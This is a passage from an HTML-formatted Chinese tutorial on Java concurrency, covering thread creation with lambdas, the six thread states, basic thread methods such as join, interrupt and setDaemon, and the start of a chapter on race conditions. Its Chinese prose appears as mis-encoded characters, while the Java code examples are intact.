<li><strong>ç”Ÿäº§ç¯å¢ƒæ¨èä½¿ç”¨</strong></li>
</ul>
<h4 data-id="heading-11">æ–¹å¼äº”ï¼šLambdaè¡¨è¾¾å¼åˆ›å»º</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LambdaThread</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// æ–¹å¼1ï¼šä½¿ç”¨Runnableçš„Lambdaè¡¨è¾¾å¼</span>
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            System.out.println(<span class="hljs-string">"Lambdaçº¿ç¨‹: "</span> + Thread.currentThread().getName());
        });
        thread1.start();
        
        <span class="hljs-comment">// æ–¹å¼2ï¼šç›´æ¥ä½¿ç”¨çº¿ç¨‹æ± </span>
        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newCachedThreadPool();
        executor.submit(() -&gt; {
            System.out.println(<span class="hljs-string">"çº¿ç¨‹æ± Lambda: "</span> + Thread.currentThread().getName());
        });
        executor.shutdown();
    }
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ä»£ç ç®€æ´</li>
<li>é€‚åˆç®€å•çš„ä»»åŠ¡</li>
<li>Java 8+æ”¯æŒ</li>
</ul>
<h3 data-id="heading-12">1.3 çº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸ</h3>
<p>Javaçº¿ç¨‹æœ‰6ç§çŠ¶æ€ï¼Œå®šä¹‰åœ¨<code>Thread.State</code>æšä¸¾ä¸­ï¼š</p>
<h4 data-id="heading-13">NEWï¼ˆæ–°å»ºï¼‰</h4>
<p>çº¿ç¨‹è¢«åˆ›å»ºä½†å°šæœªå¯åŠ¨çš„çŠ¶æ€ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {});
System.out.println(thread.getState()); <span class="hljs-comment">// NEW</span>
</code></pre>
<h4 data-id="heading-14">RUNNABLEï¼ˆå¯è¿è¡Œï¼‰</h4>
<p>çº¿ç¨‹æ­£åœ¨JVMä¸­æ‰§è¡Œï¼Œä½†å¯èƒ½æ­£åœ¨ç­‰å¾…æ“ä½œç³»ç»Ÿåˆ†é…CPUæ—¶é—´ç‰‡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) {
        <span class="hljs-comment">// è¿è¡Œä¸­æˆ–ç­‰å¾…CPUæ—¶é—´ç‰‡</span>
    }
});
thread.start();
System.out.println(thread.getState()); <span class="hljs-comment">// RUNNABLE</span>
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong> RUNNABLEçŠ¶æ€åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>Running</strong>ï¼šæ­£åœ¨æ‰§è¡Œ</li>
<li><strong>Ready</strong>ï¼šå°±ç»ªï¼Œç­‰å¾…CPUè°ƒåº¦</li>
</ul>
<h4 data-id="heading-15">BLOCKEDï¼ˆé˜»å¡ï¼‰</h4>
<p>çº¿ç¨‹è¢«é˜»å¡ï¼Œç­‰å¾…è·å–ç›‘è§†å™¨é”ï¼ˆmonitor lockï¼‰ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BlockedExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">synchronized</span> (lock) {
                <span class="hljs-keyword">try</span> {
                    Thread.sleep(<span class="hljs-number">5000</span>); <span class="hljs-comment">// æŒæœ‰é”5ç§’</span>
                } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
        
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">synchronized</span> (lock) {
                <span class="hljs-comment">// ç­‰å¾…thread1é‡Šæ”¾é”</span>
            }
        });
        
        thread1.start();
        Thread.sleep(<span class="hljs-number">100</span>); <span class="hljs-comment">// ç¡®ä¿thread1å…ˆè·å–é”</span>
        thread2.start();
        Thread.sleep(<span class="hljs-number">100</span>);
        
        System.out.println(thread2.getState()); <span class="hljs-comment">// BLOCKED</span>
    }
}
</code></pre>
<h4 data-id="heading-16">WAITINGï¼ˆç­‰å¾…ï¼‰</h4>
<p>çº¿ç¨‹æ— é™æœŸç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œç‰¹å®šæ“ä½œã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WaitingExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">synchronized</span> (lock) {
                <span class="hljs-keyword">try</span> {
                    lock.wait(); <span class="hljs-comment">// è¿›å…¥WAITINGçŠ¶æ€</span>
                } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
        
        thread.start();
        Thread.sleep(<span class="hljs-number">100</span>);
        System.out.println(thread.getState()); <span class="hljs-comment">// WAITING</span>
    }
}
</code></pre>
<p><strong>è¿›å…¥WAITINGçŠ¶æ€çš„æ–¹æ³•ï¼š</strong></p>
<ul>
<li><code>Object.wait()</code> - ç­‰å¾…è¢«notify/notifyAllå”¤é†’</li>
<li><code>Thread.join()</code> - ç­‰å¾…ç›®æ ‡çº¿ç¨‹æ‰§è¡Œå®Œæˆ</li>
<li><code>LockSupport.park()</code> - ç­‰å¾…è¢«unparkå”¤é†’</li>
</ul>
<h4 data-id="heading-17">TIMED_WAITINGï¼ˆè¶…æ—¶ç­‰å¾…ï¼‰</h4>
<p>çº¿ç¨‹åœ¨æŒ‡å®šæ—¶é—´å†…ç­‰å¾…ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TimedWaitingExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">try</span> {
                Thread.sleep(<span class="hljs-number">5000</span>); <span class="hljs-comment">// è¿›å…¥TIMED_WAITINGçŠ¶æ€</span>
            } <span class="hljs-keyword">catch</span> (InterruptedException e) {
                e.printStackTrace();
            }
        });
        
        thread.start();
        Thread.sleep(<span class="hljs-number">100</span>);
        System.out.println(thread.getState()); <span class="hljs-comment">// TIMED_WAITING</span>
    }
}
</code></pre>
<p><strong>è¿›å…¥TIMED_WAITINGçŠ¶æ€çš„æ–¹æ³•ï¼š</strong></p>
<ul>
<li><code>Thread.sleep(long millis)</code></li>
<li><code>Object.wait(long timeout)</code></li>
<li><code>Thread.join(long millis)</code></li>
<li><code>LockSupport.parkNanos()</code></li>
<li><code>LockSupport.parkUntil()</code></li>
</ul>
<h4 data-id="heading-18">TERMINATEDï¼ˆç»ˆæ­¢ï¼‰</h4>
<p>çº¿ç¨‹æ‰§è¡Œå®Œæˆæˆ–å¼‚å¸¸ç»ˆæ­¢ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    System.out.println(<span class="hljs-string">"æ‰§è¡Œå®Œæˆ"</span>);
});
thread.start();
thread.join(); <span class="hljs-comment">// ç­‰å¾…çº¿ç¨‹æ‰§è¡Œå®Œæˆ</span>
System.out.println(thread.getState()); <span class="hljs-comment">// TERMINATED</span>
</code></pre>
<h4 data-id="heading-19">çŠ¶æ€è½¬æ¢å›¾</h4>
<pre><code class="hljs language-scss" lang="scss">    NEW
     |
     | <span class="hljs-built_in">start</span>()
     â†“
RUNNABLE â†â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
     |               |
     | wait()        | <span class="hljs-built_in">notify</span>()/<span class="hljs-built_in">notifyAll</span>()
     â†“               |
  WAITING â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
     |
     | <span class="hljs-built_in">sleep</span>(timeout)/wait(timeout)/<span class="hljs-built_in">join</span>(timeout)
     â†“
TIMED_WAITING
     |
     | è·å–é”å¤±è´¥
     â†“
  BLOCKED
     |
     | è·å–åˆ°é”
     â†“
RUNNABLE
     |
     | <span class="hljs-built_in">run</span>()æ–¹æ³•æ‰§è¡Œå®Œæˆæˆ–å¼‚å¸¸
     â†“
 TERMINATED
</code></pre>
<h3 data-id="heading-20">1.4 çº¿ç¨‹çš„åŸºæœ¬æ“ä½œ</h3>
<h4 data-id="heading-21">start()æ–¹æ³•</h4>
<p>å¯åŠ¨çº¿ç¨‹ï¼Œä½¿çº¿ç¨‹è¿›å…¥RUNNABLEçŠ¶æ€ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    System.out.println(<span class="hljs-string">"çº¿ç¨‹æ‰§è¡Œ"</span>);
});
thread.start(); <span class="hljs-comment">// å¯åŠ¨çº¿ç¨‹</span>
<span class="hljs-comment">// thread.start(); // é”™è¯¯ï¼ä¸èƒ½é‡å¤è°ƒç”¨start()</span>
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li><code>start()</code>åªèƒ½è°ƒç”¨ä¸€æ¬¡ï¼Œé‡å¤è°ƒç”¨ä¼šæŠ›å‡º<code>IllegalThreadStateException</code></li>
<li><code>start()</code>ä¼šåˆ›å»ºæ–°çš„çº¿ç¨‹ï¼Œè€Œ<code>run()</code>åªæ˜¯æ™®é€šæ–¹æ³•è°ƒç”¨</li>
</ul>
<h4 data-id="heading-22">run()æ–¹æ³•</h4>
<p>çº¿ç¨‹çš„æ‰§è¡Œä½“ï¼ŒåŒ…å«çº¿ç¨‹è¦æ‰§è¡Œçš„ä»£ç ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    System.out.println(<span class="hljs-string">"runæ–¹æ³•æ‰§è¡Œ"</span>);
});
thread.run(); <span class="hljs-comment">// ç›´æ¥è°ƒç”¨run()ï¼Œä¸ä¼šåˆ›å»ºæ–°çº¿ç¨‹ï¼Œåœ¨å½“å‰çº¿ç¨‹æ‰§è¡Œ</span>
thread.start(); <span class="hljs-comment">// è°ƒç”¨start()ï¼Œåˆ›å»ºæ–°çº¿ç¨‹æ‰§è¡Œrun()æ–¹æ³•</span>
</code></pre>
<p><strong>start() vs run()ï¼š</strong></p>
<ul>
<li><code>start()</code>ï¼šåˆ›å»ºæ–°çº¿ç¨‹ï¼Œå¼‚æ­¥æ‰§è¡Œ</li>
<li><code>run()</code>ï¼šæ™®é€šæ–¹æ³•è°ƒç”¨ï¼ŒåŒæ­¥æ‰§è¡Œ</li>
</ul>
<h4 data-id="heading-23">sleep()æ–¹æ³•</h4>
<p>è®©å½“å‰çº¿ç¨‹ä¼‘çœ æŒ‡å®šæ—¶é—´ï¼Œè¿›å…¥TIMED_WAITINGçŠ¶æ€ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">try</span> {
    Thread.sleep(<span class="hljs-number">1000</span>); <span class="hljs-comment">// ä¼‘çœ 1ç§’</span>
    System.out.println(<span class="hljs-string">"ä¼‘çœ ç»“æŸ"</span>);
} <span class="hljs-keyword">catch</span> (InterruptedException e) {
    e.printStackTrace();
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ä¸é‡Šæ”¾é”</li>
<li>å¯èƒ½æŠ›å‡º<code>InterruptedException</code></li>
<li>æ—¶é—´åˆ°äº†è‡ªåŠ¨å”¤é†’</li>
</ul>
<h4 data-id="heading-24">yield()æ–¹æ³•</h4>
<p>æç¤ºè°ƒåº¦å™¨å½“å‰çº¿ç¨‹æ„¿æ„è®©å‡ºCPUæ—¶é—´ç‰‡ï¼Œä½†è°ƒåº¦å™¨å¯ä»¥å¿½ç•¥è¿™ä¸ªæç¤ºã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
        System.out.println(Thread.currentThread().getName() + <span class="hljs-string">": "</span> + i);
        Thread.<span class="hljs-keyword">yield</span>(); <span class="hljs-comment">// è®©å‡ºCPUæ—¶é—´ç‰‡</span>
    }
});
thread.start();
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li><code>yield()</code>åªæ˜¯æç¤ºï¼Œä¸ä¿è¯ä¸€å®šä¼šè®©å‡ºCPU</li>
<li>é€‚åˆç”¨äºè°ƒè¯•å’Œæµ‹è¯•ï¼Œç”Ÿäº§ç¯å¢ƒä¸å¸¸ç”¨</li>
</ul>
<h4 data-id="heading-25">join()æ–¹æ³•</h4>
<p>ç­‰å¾…ç›®æ ‡çº¿ç¨‹æ‰§è¡Œå®Œæˆã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">try</span> {
        Thread.sleep(<span class="hljs-number">2000</span>);
        System.out.println(<span class="hljs-string">"thread1æ‰§è¡Œå®Œæˆ"</span>);
    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
        e.printStackTrace();
    }
});

<span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">try</span> {
        thread1.join(); <span class="hljs-comment">// ç­‰å¾…thread1æ‰§è¡Œå®Œæˆ</span>
        System.out.println(<span class="hljs-string">"thread2æ‰§è¡Œå®Œæˆ"</span>);
    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
        e.printStackTrace();
    }
});

thread1.start();
thread2.start();
</code></pre>
<p><strong>é‡è½½æ–¹æ³•ï¼š</strong></p>
<ul>
<li><code>join()</code> - æ— é™æœŸç­‰å¾…</li>
<li><code>join(long millis)</code> - ç­‰å¾…æŒ‡å®šæ—¶é—´</li>
<li><code>join(long millis, int nanos)</code> - ç­‰å¾…æŒ‡å®šæ—¶é—´ï¼ˆçº³ç§’ç²¾åº¦ï¼‰</li>
</ul>
<h4 data-id="heading-26">interrupt()æ–¹æ³•</h4>
<p>ä¸­æ–­çº¿ç¨‹ï¼Œè®¾ç½®çº¿ç¨‹çš„ä¸­æ–­æ ‡å¿—ä½ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">while</span> (!Thread.currentThread().isInterrupted()) {
        System.out.println(<span class="hljs-string">"è¿è¡Œä¸­..."</span>);
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">1000</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            <span class="hljs-comment">// æ•è·å¼‚å¸¸åï¼Œä¸­æ–­æ ‡å¿—ä½è¢«æ¸…é™¤</span>
            System.out.println(<span class="hljs-string">"çº¿ç¨‹è¢«ä¸­æ–­"</span>);
            Thread.currentThread().interrupt(); <span class="hljs-comment">// é‡æ–°è®¾ç½®ä¸­æ–­æ ‡å¿—</span>
            <span class="hljs-keyword">break</span>;
        }
    }
});

thread.start();
Thread.sleep(<span class="hljs-number">3000</span>);
thread.interrupt(); <span class="hljs-comment">// ä¸­æ–­çº¿ç¨‹</span>
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li><code>interrupt()</code>åªæ˜¯è®¾ç½®ä¸­æ–­æ ‡å¿—ä½ï¼Œä¸ä¼šå¼ºåˆ¶åœæ­¢çº¿ç¨‹</li>
<li>çº¿ç¨‹éœ€è¦æ£€æŸ¥ä¸­æ–­æ ‡å¿—ä½å¹¶è‡ªè¡Œé€€å‡º</li>
<li>å¦‚æœçº¿ç¨‹åœ¨é˜»å¡çŠ¶æ€ï¼ˆsleepã€waitç­‰ï¼‰ï¼Œä¼šæŠ›å‡º<code>InterruptedException</code></li>
</ul>
<h4 data-id="heading-27">isInterrupted()æ–¹æ³•</h4>
<p>æ£€æŸ¥çº¿ç¨‹çš„ä¸­æ–­æ ‡å¿—ä½ï¼Œ<strong>ä¸ä¼šæ¸…é™¤</strong>æ ‡å¿—ä½ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {});
thread.start();
thread.interrupt();
System.out.println(thread.isInterrupted()); <span class="hljs-comment">// true</span>
System.out.println(thread.isInterrupted()); <span class="hljs-comment">// trueï¼ˆæ ‡å¿—ä½è¿˜åœ¨ï¼‰</span>
</code></pre>
<h4 data-id="heading-28">interrupted()æ–¹æ³•</h4>
<p>æ£€æŸ¥å½“å‰çº¿ç¨‹çš„ä¸­æ–­æ ‡å¿—ä½ï¼Œ<strong>ä¼šæ¸…é™¤</strong>æ ‡å¿—ä½ã€‚</p>
<pre><code class="hljs language-java" lang="java">Thread.currentThread().interrupt();
System.out.println(Thread.interrupted()); <span class="hljs-comment">// true</span>
System.out.println(Thread.interrupted()); <span class="hljs-comment">// falseï¼ˆæ ‡å¿—ä½è¢«æ¸…é™¤ï¼‰</span>
</code></pre>
<h4 data-id="heading-29">setDaemon()å®ˆæŠ¤çº¿ç¨‹</h4>
<p>è®¾ç½®çº¿ç¨‹ä¸ºå®ˆæŠ¤çº¿ç¨‹ï¼Œå½“æ‰€æœ‰éå®ˆæŠ¤çº¿ç¨‹ç»“æŸæ—¶ï¼ŒJVMä¼šè‡ªåŠ¨é€€å‡ºã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">daemonThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        System.out.println(<span class="hljs-string">"å®ˆæŠ¤çº¿ç¨‹è¿è¡Œä¸­..."</span>);
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">1000</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            e.printStackTrace();
        }
    }
});

daemonThread.setDaemon(<span class="hljs-literal">true</span>); <span class="hljs-comment">// è®¾ç½®ä¸ºå®ˆæŠ¤çº¿ç¨‹</span>
daemonThread.start();

Thread.sleep(<span class="hljs-number">3000</span>);
System.out.println(<span class="hljs-string">"ä¸»çº¿ç¨‹ç»“æŸï¼ŒJVMé€€å‡º"</span>);
<span class="hljs-comment">// å®ˆæŠ¤çº¿ç¨‹ä¹Ÿä¼šéšä¹‹ç»“æŸ</span>
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å®ˆæŠ¤çº¿ç¨‹ä¸èƒ½ç‹¬ç«‹å­˜åœ¨ï¼Œå¿…é¡»ä¾èµ–éå®ˆæŠ¤çº¿ç¨‹</li>
<li>é€‚åˆæ‰§è¡Œåå°ä»»åŠ¡ï¼Œå¦‚åƒåœ¾å›æ”¶ã€ç›‘æ§ç­‰</li>
<li>å¿…é¡»åœ¨<code>start()</code>ä¹‹å‰è®¾ç½®</li>
</ul>
<h4 data-id="heading-30">setPriority()çº¿ç¨‹ä¼˜å…ˆçº§</h4>
<p>è®¾ç½®çº¿ç¨‹çš„ä¼˜å…ˆçº§ï¼ˆ1-10ï¼‰ï¼Œæ•°å­—è¶Šå¤§ä¼˜å…ˆçº§è¶Šé«˜ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">thread1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
        System.out.println(<span class="hljs-string">"é«˜ä¼˜å…ˆçº§: "</span> + i);
    }
});

<span class="hljs-type">Thread</span> <span class="hljs-variable">thread2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
        System.out.println(<span class="hljs-string">"ä½ä¼˜å…ˆçº§: "</span> + i);
    }
});

thread1.setPriority(Thread.MAX_PRIORITY); <span class="hljs-comment">// 10</span>
thread2.setPriority(Thread.MIN_PRIORITY);  <span class="hljs-comment">// 1</span>

thread1.start();
thread2.start();
</code></pre>
<p><strong>ä¼˜å…ˆçº§å¸¸é‡ï¼š</strong></p>
<ul>
<li><code>Thread.MIN_PRIORITY = 1</code></li>
<li><code>Thread.NORM_PRIORITY = 5</code>ï¼ˆé»˜è®¤ï¼‰</li>
<li><code>Thread.MAX_PRIORITY = 10</code></li>
</ul>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li>ä¼˜å…ˆçº§åªæ˜¯æç¤ºï¼Œæ“ä½œç³»ç»Ÿå¯èƒ½å¿½ç•¥</li>
<li>ä¸åŒæ“ä½œç³»ç»Ÿå¯¹ä¼˜å…ˆçº§çš„å¤„ç†ä¸åŒ</li>
<li>ä¸æ¨èä¾èµ–ä¼˜å…ˆçº§æ¥ä¿è¯ç¨‹åºæ­£ç¡®æ€§</li>
</ul>
<hr/>
<h2 data-id="heading-31">ç¬¬äºŒç«  çº¿ç¨‹å®‰å…¨åŸºç¡€</h2>
<h3 data-id="heading-32">2.1 ä»€ä¹ˆæ˜¯çº¿ç¨‹å®‰å…¨</h3>
<h4 data-id="heading-33">çº¿ç¨‹å®‰å…¨çš„å®šä¹‰</h4>
<p>**çº¿ç¨‹å®‰å…¨ï¼ˆThread Safetyï¼‰**æ˜¯æŒ‡å½“å¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¸éœ€è¦é¢å¤–çš„åŒæ­¥æœºåˆ¶ï¼Œç¨‹åºä»èƒ½æ­£ç¡®æ‰§è¡Œï¼Œå¹¶ä¸”ç»“æœç¬¦åˆé¢„æœŸã€‚</p>
<p><strong>Brian Goetzåœ¨ã€ŠJavaå¹¶å‘ç¼–ç¨‹å®æˆ˜ã€‹ä¸­çš„å®šä¹‰ï¼š</strong></p>
<blockquote>
<p>å½“å¤šä¸ªçº¿ç¨‹è®¿é—®æŸä¸ªç±»æ—¶ï¼Œä¸ç®¡è¿è¡Œæ—¶ç¯å¢ƒé‡‡ç”¨ä½•ç§è°ƒåº¦æ–¹å¼æˆ–è€…è¿™äº›çº¿ç¨‹å°†å¦‚ä½•äº¤æ›¿æ‰§è¡Œï¼Œå¹¶ä¸”åœ¨ä¸»è°ƒä»£ç ä¸­ä¸éœ€è¦ä»»ä½•é¢å¤–çš„åŒæ­¥æˆ–ååŒï¼Œè¿™ä¸ªç±»éƒ½èƒ½è¡¨ç°å‡ºæ­£ç¡®çš„è¡Œä¸ºï¼Œé‚£ä¹ˆå°±ç§°è¿™ä¸ªç±»æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚</p>
</blockquote>
<h4 data-id="heading-34">ç«æ€æ¡ä»¶ï¼ˆRace Conditionï¼‰</h4>
<p><strong>ç«æ€æ¡ä»¶</strong>æ˜¯æŒ‡ç¨‹åºçš„æ‰§è¡Œç»“æœä¾èµ–äºçº¿ç¨‹æ‰§è¡Œçš„ç›¸å¯¹æ—¶åºã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RaceCondition</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++; <span class="hljs-comment">// ä¸æ˜¯åŸå­æ“ä½œ</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCount</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> count;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">RaceCondition</span> <span class="hljs-variable">rc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RaceCondition</span>();
        
        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
                rc.increment();
            }
        });
        
        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
                rc.increment();
            }
        });
        
        t1.start();
        t2.start();
        t1.join();
        t2.join();
        
        System.out.println(<span class="hljs-string">"æœ€ç»ˆç»“æœ: "</span> + rc.getCount()); 
        <span class="hljs-comment">// æœŸæœ›20000ï¼Œå®é™…å¯èƒ½å°äº20000</span>
    }
}
</code></pre>
<p><strong>åŸå› åˆ†æï¼š</strong>
<code>count++</code>ä¸æ˜¯åŸå­æ“ä½œï¼Œå®é™…åŒ…å«ä¸‰ä¸ªæ­¥éª¤ï¼š</p>
<ol>
<li>è¯»å–countçš„å€¼</li>
<li>å°†countåŠ 1</li>
<li>å°†æ–°å€¼å†™å›count</li>
</ol>
<p>ä¸¤ä¸ªçº¿ç¨‹å¯èƒ½åŒæ—¶è¯»å–åˆ°ç›¸åŒçš„å€¼ï¼Œå¯¼è‡´ç»“æœä¸æ­£ç¡®ã€‚</p>
<h4 data-id="heading-35">æ•°æ®ç«äº‰ï¼ˆData Raceï¼‰</h4>
